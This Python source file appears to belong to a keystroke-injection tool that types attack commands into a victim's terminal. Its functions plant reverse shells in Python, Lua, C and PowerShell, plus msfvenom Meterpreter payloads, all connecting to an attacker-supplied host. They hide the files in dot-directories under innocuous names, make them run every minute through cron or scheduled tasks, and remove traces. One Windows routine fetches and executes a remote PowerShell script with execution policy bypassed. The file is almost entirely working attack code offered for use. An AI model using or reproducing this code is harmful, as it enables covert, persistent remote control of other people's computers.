from .utils import *

### Programmation Languages Little Shells
def linux_python3_shell(vlue, remoteServ, remotePort):  # Correction du nom de la variable "vlue"
    sequence = [LINUX_TERMINAL]
    
    CTRL_X = (KeyCode.LEFT_CTRL, KeyCode.X)
    # It Opens and Close Vi Editor
    mkdirHiddenFile = 'mkdir .python3_12'
    cdHiddenFile = 'cd .python3_12'
    goToViPy = 'vi .game.py'
    quitVi = ':wq'
    
    ReverseShell = [
        "aimport socket",  # Correction de l'erreur "aimport"
        "import os",
        "import pty", 
        " ",
        f"RemoteHost = '{remoteServ}'",
        f"RemotePort = {remotePort}",
        " ",
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
        "s.connect((RemoteHost, RemotePort))",
        " ",
        "os.dup2(s.fileno(), 0)",
        "os.dup2(s.fileno(), 1)",
        "os.dup2(s.fileno(), 2)",
        " ",
        "pty.spawn('/bin/sh')",
    ]
    
    editCronjobs = '(crontab -l; echo "* * * * * /usr/bin/python3 $(realpath .game.py)") | crontab -'
    
    exitTerm = 'exit'
    
    # mkdir Hidden Working Directory
    for letters in stringSeq(mkdirHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Open Vi Editor
    for letters in stringSeq(goToViPy):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Write Python Reverse Shell
    for line in ReverseShell:
        for i in stringSeq(line):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Quit Vi Editor
    sequence.append(ESCAPE)
    
    for letters in stringSeq(quitVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Modifying Crontab to connect back to your server every minute
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Removing Traces
    sendKeys(sequence, vlue, 0.01)
    
def mac_python3_shell(vlue, remoteServ, remotePort):  # Correction du nom de la variable "vlue"
    sequence = [MAC_TERMINAL]
    terminal = "terminal"
    
    for letters in stringSeq(terminal):
        sequence.append(letters)
    sequence.append(ENTER)
    
    CTRL_X = (KeyCode.LEFT_CTRL, KeyCode.X)
    # It Opens and Close Vi Editor
    mkdirHiddenFile = 'mkdir .python3_12'
    cdHiddenFile = 'cd .python3_12'
    goToViPy = 'vi .game.py'
    quitVi = ':wq'
    
    ReverseShell = [
        "aimport socket",  # Correction de l'erreur "aimport"
        "import os",
        "import pty", 
        " ",
        f"RemoteHost = '{remoteServ}'",
        f"RemotePort = {remotePort}",
        " ",
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
        "s.connect((RemoteHost, RemotePort))",
        " ",
        "os.dup2(s.fileno(), 0)",
        "os.dup2(s.fileno(), 1)",
        "os.dup2(s.fileno(), 2)",
        " ",
        "pty.spawn('/bin/sh')",
    ]
    
    editCronjobs = '(crontab -l; echo "* * * * * /usr/bin/python3 $(realpath .game.py)") | crontab -'
    
    exitTerm = 'exit'
    
    # mkdir Hidden Working Directory
    for letters in stringSeq(mkdirHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Open Vi Editor
    for letters in stringSeq(goToViPy):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Write Python Reverse Shell
    for line in ReverseShell:
        for i in stringSeq(line):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Quit Vi Editor
    sequence.append(ESCAPE)
    
    for letters in stringSeq(quitVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Modifying Crontab to connect back to your server every minute
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Removing Traces
    sendKeys(sequence, vlue, 0.01)
    
def lua_shell(vlue, remoteServ, remotePort):  # Correction du nom de la variable "vlue"
    sequence = [LINUX_TERMINAL]
    
    CTRL_X = (KeyCode.LEFT_CTRL, KeyCode.X)
    # It Opens and Close Vi Editor
    mkdirHiddenFile = 'mkdir .lua_history'
    cdHiddenFile = 'cd .lua_history'
    goToVi = 'vi .nmap.lua'
    quitVi = ':wq'
    
    ReverseShell = [
        f'alocal host, port = "{remoteServ}", {remotePort}',
        " ",
        "local tcp = socket.tcp()",
        "tcp:connect(host, port)",
        " ",
        "while true do",
        "    local cmd, status, partial = tcp:receive()",
        " ",
        " ",
        "    if cmd then",
        '        local f = io.popen(cmd, "r")',
        '        local s = f:read("*a")',
        '        f:close()',
        '        tcp:send(s)',
        "    end",
        '    if status == "closed" then',
        "        break",
        "    end",
        "end",
        " ",
        " ",
        "tcp:close()",
    ]
    
    editCronjobs = '(crontab -l; echo "* * * * * /usr/bin/lua $(realpath .nmap.lua)") | crontab -'
    
    exitTerm = 'exit'
    
    # mkdir Hidden Working Directory
    for letters in stringSeq(mkdirHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Open Vi Editor
    for letters in stringSeq(goToVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Write Python Reverse Shell
    for line in ReverseShell:
        for i in stringSeq(line):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Quit Vi Editor
    sequence.append(ESCAPE)
    
    for letters in stringSeq(quitVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Modifying Crontab to connect back to your server every minute
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Removing Traces
    sendKeys(sequence, vlue, 0.01)
    
    
def cLinuxShell(vlue, remoteServ, remotePort):
    sequence = [LINUX_TERMINAL]
    
    # It Opens and Close Vi Editor
    mkdirHiddenFile = 'mkdir .c_history'
    cdHiddenFile = 'cd .c_history'
    goToVi = 'vi .shell.c'
    quitVi = ':wq'
    
    ReverseShell = [
        'a#include <stdio.h>',
        '#include <sys/socket.h>',
        '#include <sys/types.h>',
        '#include <stdlib.h>',
        '#include <unistd.h>',
        '#include <netinet/in.h>',
        '#include <arpa/inet.h>',
        " ",
        "int main(void){",
        f"    int port = {remotePort};",
        "    struct sockaddr_in revsockaddr;",
        " ",
        "    int sockt = socket(AF_INET, SOCK_STREAM, 0);",
        "    revsockaddr.sin_family = AF_INET;  ",
        "    revsockaddr.sin_port = htons(port);",
        f'    revsockaddr.sin_addr.s_addr = inet_addr("{remoteServ}");',
        " ",
        "    connect(sockt, (struct sockaddr *) &revsockaddr, ",
        "    sizeof(revsockaddr));",
        "    dup2(sockt, 0);",
        "    dup2(sockt, 1);",
        "    dup2(sockt, 2);",
        " ",
        '    char * const argv[] = {"/bin/sh", NULL};',
        '    execve("/bin/sh", argv, NULL);',
        " ",
        "    return 0;",
        "}",
    ]
    
    makeExecutable = "gcc .shell.c --output .csh"
    
    editCronjobs = '(crontab -l; echo "* * * * * $(realpath .csh)") | crontab -'
    
    rmScript = 'rm .shell.c'
    goBack = 'cd ..'
    
    exitTerm = 'exit'
    
    # mkdir Hidden Working Directory
    for letters in stringSeq(mkdirHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Open Vi Editor
    for letters in stringSeq(goToVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Write Python Reverse Shell
    for line in ReverseShell:
        for i in stringSeq(line):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Quit Vi Editor
    sequence.append(ESCAPE)
    
    for letters in stringSeq(quitVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Make Executable
    for letters in stringSeq(makeExecutable):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Modifying Crontab to connect back to your server every minute
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Removing Traces
    for letters in stringSeq(rmScript):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(goBack):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(exitTerm):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
def cMacShell(vlue, remoteServ, remotePort):
    sequence = [MAC_TERMINAL]
    terminal = "terminal"
    
    for letters in stringSeq(terminal):
        sequence.append(letters)
    sequence.append(ENTER)
    
    
    # It Opens and Close Vi Editor
    mkdirHiddenFile = 'mkdir .c_history'
    cdHiddenFile = 'cd .c_history'
    goToVi = 'vi .shell.c'
    quitVi = ':wq'
    
    ReverseShell = [
        'a#include <stdio.h>',
        '#include <sys/socket.h>',
        '#include <sys/types.h>',
        '#include <stdlib.h>',
        '#include <unistd.h>',
        '#include <netinet/in.h>',
        '#include <arpa/inet.h>',
        " ",
        "int main(void){",
        f"    int port = {remotePort};",
        "    struct sockaddr_in revsockaddr;",
        " ",
        "    int sockt = socket(AF_INET, SOCK_STREAM, 0);",
        "    revsockaddr.sin_family = AF_INET;  ",
        "    revsockaddr.sin_port = htons(port);",
        f'    revsockaddr.sin_addr.s_addr = inet_addr("{remoteServ}");',
        " ",
        "    connect(sockt, (struct sockaddr *) &revsockaddr, ",
        "    sizeof(revsockaddr));",
        "    dup2(sockt, 0);",
        "    dup2(sockt, 1);",
        "    dup2(sockt, 2);",
        " ",
        '    char * const argv[] = {"/bin/sh", NULL};',
        '    execve("/bin/sh", argv, NULL);',
        " ",
        "    return 0;",
        "}",
    ]
    
    makeExecutable = "clang .shell.c -o .csh"
    
    editCronjobs = '(crontab -l; echo "* * * * * $(pwd/.csh)") | crontab -'
    
    rmScript = 'rm .shell.c'
    goBack = 'cd ..'
    
    exitTerm = 'exit'
    
    # mkdir Hidden Working Directory
    for letters in stringSeq(mkdirHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenFile):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Open Vi Editor
    for letters in stringSeq(goToVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Write Python Reverse Shell
    for line in ReverseShell:
        for i in stringSeq(line):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Quit Vi Editor
    sequence.append(ESCAPE)
    
    for letters in stringSeq(quitVi):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Make Executable
    for letters in stringSeq(makeExecutable):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Modifying Crontab to connect back to your server every minute
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Removing Traces
    for letters in stringSeq(rmScript):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(goBack):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(exitTerm):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
### Reverse Shells Metasploit
        
def linuxStagedSploit(vlue, srv, prt):
    sequence = [LINUX_TERMINAL]
        
    createPayload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={srv} LPORT={prt} -f elf > reverse.elf"
    makeExecutable = "chmod +x reverse.elf"
    
    for letters in stringSeq(createPayload):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    sequence = []
    
    for letters in stringSeq(makeExecutable):
        sequence.append(letters)
    sequence.append(ENTER)
    
    editCronjobs = '(crontab -l; echo "* * * * * $(realpath reverse.elf)") | crontab -'
    
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    time.sleep(3)
    sendKeys(sequence, vlue, 0.01)
        
def linuxStagelessSploit(vlue, srv, prt):
    sequence = [LINUX_TERMINAL]
    
    createPayload = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={srv} LPORT={prt} -f elf > reverse.elf"
    makeExecutable = "chmod +x reverse.elf"
    
    for letters in stringSeq(createPayload):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    sequence = []
    
    for letters in stringSeq(makeExecutable):
        sequence.append(letters)
    sequence.append(ENTER)
    
    editCronjobs = '(crontab -l; echo "* * * * * $(realpath reverse.elf)") | crontab -'
    
    for letters in stringSeq(editCronjobs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    time.sleep(3)
    sendKeys(sequence, vlue, 0.01)

##win_conpty_shell here
def win_conpty_shell(vlue, srv, prt):
    sequence = [KeyCode.LEFT_UI]
    ps = 'powershell'
    
    for letters in stringSeq(ps):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.03)
    sequence = []
    time.sleep(3)
    
    #Script VBS
    line1vbs = '$line1 = \'Set objShell = CreateObject("Wscript.shell")\''
    line2vbs = f'$line2 = \'objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""C:\\Users\\agape\\.c_history\\diy.ps1""'
    line2vbsCompleted = '", 0, False\''
    
    echoLine1 = '$line1 | Out-File -FilePath "diy.vbs" -Encoding ASCII'
    echoLine2 = '$line2 | Out-File -FilePath "diy.vbs" -Append -Encoding ASCII'
        
    for letters in stringSeq(line1vbs):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(line2vbs):
        sequence.append(letters)
    
    for letters in stringSeq(line2vbsCompleted):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(echoLine1):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(echoLine2):
        sequence.append(letters)
    sequence.append(ENTER)
    
    #Script PowerShell
    line1ps1 = f'$line1 = \'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {srv} {prt}\''
    
    echoLine1ps1 = '$line1 | Out-File -FilePath "diy.ps1" -Encoding ASCII'

    for letters in stringSeq(line1ps1):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(echoLine1ps1):
        sequence.append(letters)
    sequence.append(ENTER)
    
    #Add Vbs Script to schtasks
    scriptPath = '$scriptPath = Resolve-Path "diy.vbs"'
    scheduled = '''schtasks /create /sc minute /mo 1 /tn "DirsLookup" /tr "wscript.exe `"$scriptPath`"" /F'''
    
    for letters in stringSeq(scriptPath):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(scheduled):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)

def reversedPowerShell(vlue, remoteServ, remotePort):
    sequence = []
    
    powershell = "powershell"
    createHiddenDir = 'mkdir .c_history'
    cdHiddenDir = 'cd .c_history'
    
    ReverseShell = [
        f'$client = New-Object System.Net.Sockets.TCPClient("{remoteServ}", {remotePort});',
        '$stream = $client.GetStream();',
        '$writer = New-Object System.IO.StreamWriter($stream);',
        '$writer.AutoFlush = $true;',
        '$buffer = New-Object System.Byte[] 1024;',
        '',
        'while ($true) {',
        '    $data = "";',
        '    while ($stream.DataAvailable -eq $false) { Start-Sleep -Milliseconds 50 }',
        '    while ($stream.DataAvailable) {',
        '        $bytesRead = $stream.Read($buffer, 0, $buffer.Length);',
        '        $data += ([System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead));',
        '    }',
        '    if ($data.Trim() -eq "exit") { break }',
        '    try {',
        '        $result = Invoke-Expression $data 2>&1;',
        '    } catch {',
        '        $result = $_.Exception.Message;',
        '    }',
        '    $response = $result + "PS>";',
        '    $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($response);',
        '    $stream.Write($responseBytes, 0, $responseBytes.Length);',
        '}',
        '$writer.Close();',
        '$stream.Close();',
        '$client.Close();',
    ]
    
    
    scheduleTask = 'schtasks /create /sc minute /mo 1 /tn "ReverseShell" /tr "powershell -ExecutionPolicy Bypass -File reverse.ps1"'
    goBack = 'cd ..'
    # Étape 1 : Lancer Powershell
    sequence.append(KeyCode.LEFT_UI)
    for letters in stringSeq(powershell):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.05)
    
    time.sleep(3)

    sequence = []
    # Étape 2 : Créer un dossier caché
    for letters in stringSeq(createHiddenDir):
        sequence.append(letters)
    sequence.append(ENTER)
    
    for letters in stringSeq(cdHiddenDir):
        sequence.append(letters)
    sequence.append(ENTER)
    
    # Étape 3 : Créer le script PowerShell
    for lines in ReverseShell:
        createScript = f"echo '{lines}' >> reverse.ps1"
        for letters in stringSeq(createScript):
            sequence.append(letters)
        sequence.append(ENTER)

    # Étape 4 : Planifier la tâche
    for letters in stringSeq(scheduleTask):
        sequence.append(letters)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)